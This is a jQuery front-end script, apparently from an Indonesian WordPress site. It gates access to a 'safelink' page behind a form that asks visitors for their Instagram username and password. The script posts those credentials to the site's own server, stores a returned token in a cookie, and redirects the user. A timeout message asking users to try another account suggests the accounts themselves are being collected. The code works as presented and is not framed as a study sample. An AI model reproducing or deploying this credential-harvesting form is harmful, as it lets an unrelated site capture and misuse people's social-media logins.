var $cekTokenCF = jQuery('#token'),
  $loginBtn = jQuery('#ig_login_btn'),
  $username = jQuery('#username_ig'),
  $password = jQuery('#password_ig'),
  $formLogin = jQuery('#ig_login_form');

$formLogin.on('submit', function (e) {
  e.preventDefault();
  addBtnLoading();
  addDisableInput();
  if ($cekTokenCF != '') {
    jQuery.ajax({
      type: 'POST',
      url: ajaxurl,
      data: {
        action: 'validate_token',
        token: $cekTokenCF.val(),
      },
      success: function (data) {
        var dataParse = JSON.parse(data);

        if (dataParse.success == true) {
          //start here
          jQuery.ajax({
            type: 'POST',
            url: ajaxurl,
            timeout: 60000,
            data: {
              action: 'ig_login',
              username: $username.val(),
              password: $password.val(),
            },
            success: function (data) {
              var dataParse = JSON.parse(data);
              if (dataParse.message) {
                var text = 'Maaf ada kendala, mohon periksa kembali akun kamu.';
                clearAll(text);
              } else {
                removeBtnLoading();
                removeDisableInput();
                //set session
                setCookie('i_login_token', dataParse.data.token, 3600);

                if (localStorage.getItem('i_login_token') != '') {
                  successAlert();
                } else {
                  var text = 'Maaf ada kendala, mohon periksa kembali akun kamu dan coba login lagi.';
                  clearAll(text);
                }
              }
            },
            error: function (XMLHttpRequest, textStatus, errorThrown) {
              if (textStatus === 'timeout') {
                clearAll('Silahkan Refresh dan gunakan akun lain');
              }
              removeBtnLoading();
              removeDisableInput();
            },
          });
        } else {
          var text = 'Cobalah refresh halaman dan submit lagi!';
          clearAll(text);
        }
      },
      error: function (XMLHttpRequest, textStatus, errorThrown) {
        removeBtnLoading();
        removeDisableInput();
      },
    });
  }
});

function clearAll(text) {
  document.getElementById('ig_login_form').reset();
  removeBtnLoading();
  removeDisableInput();
  Swal.fire('Ups!', text, 'info');
}

function removeBtnLoading() {
  $loginBtn.removeAttr('disabled');
  $loginBtn.html('Submit');
}

function addBtnLoading() {
  $loginBtn.attr('disabled', 'disabled');
  $loginBtn.html("<span class='spinner-border spinner-border-sm' aria-hidden='true'></span><span style='margin-left:8px;' role='status'>Loading...</span>");
}

function addDisableInput() {
  $username.attr('disabled', 'disabled');
  $password.attr('disabled', 'disabled');
}

function removeDisableInput() {
  $username.removeAttr('disabled', 'disabled');
  $password.removeAttr('disabled', 'disabled');
}

function successAlert() {
  let timerInterval;
  Swal.fire({
    title: 'Berhasil login!',
    icon: 'success',
    html: 'Kamu akan diarahkan ke halaman safelink sebentar lagi.. <b></b>',
    timer: 6000,
    timerProgressBar: true,
    allowOutsideClick: false,
    allowEscapeKey: false,
    didOpen: () => {
      Swal.showLoading();
    },
    willClose: () => {
      clearInterval(timerInterval);
    },
  }).then((result) => {
    /* Read more about handling dismissals below */
    if (result.dismiss === Swal.DismissReason.timer) {
      location.href = url_i_f;
    }
  });
}
